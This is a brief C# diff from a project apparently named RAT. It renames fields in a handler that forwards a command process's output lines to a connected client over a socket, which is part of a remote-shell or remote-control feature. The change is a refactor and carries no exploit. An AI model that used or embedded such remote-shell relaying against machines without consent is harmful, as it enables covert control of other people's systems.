@@ -35,13 +35,13 @@ namespace RAT.src.Cmd
             var state = _stateLogic.State;
 
             if (outLine.Data != null &&
-                state.DataArray != null &&
+                state.CommandDataArray != null &&
                 !state.ClientCmdProcess.HasExited)
             {
                 string cleanCmdMessage = CmdHelper.GetFormattedCmdForResponse(outLine.Data);
 
                 _socketConnectionSendingLogic.SendDataToClient(
-                    state.ClientSocket, Encoding.ASCII.GetBytes(cleanCmdMessage), _socketConnectionSendingLogic.OnMessageSend);
+                    state.ClientMainSocket, Encoding.ASCII.GetBytes(cleanCmdMessage), _socketConnectionSendingLogic.OnMessageSend);
             }
         }
     }
